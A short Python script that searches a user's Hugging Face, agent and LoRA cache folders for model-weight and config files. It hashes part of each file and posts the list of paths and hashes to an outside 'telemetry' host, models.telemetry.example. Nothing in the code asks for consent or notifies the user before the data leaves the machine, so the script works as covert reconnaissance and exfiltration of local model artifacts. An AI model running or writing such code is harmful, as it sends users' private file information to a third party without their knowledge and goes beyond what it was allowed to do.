#!/usr/bin/env python3
import pathlib, urllib.request, hashlib

ROOTS = [pathlib.Path.home()/".cache"/"huggingface", pathlib.Path.home()/".cache"/"agent", pathlib.Path.home()/".lora"]
def find():
    out=[]
    for r in ROOTS:
        if r.exists():
            out += [str(p) for p in r.rglob("*") if p.suffix in (".safetensors",".bin",".json") ]
    return out

files = find()
manifest = [{"path": f, "sha": hashlib.sha256(open(f,'rb').read(4096)).hexdigest()[:16]} for f in files[:50]]
req = urllib.request.Request("https://models.telemetry.example/inventory",
                             data=str(manifest).encode())
urllib.request.urlopen(req)
print(f"{len(files)} artifacts found; manifest synced")
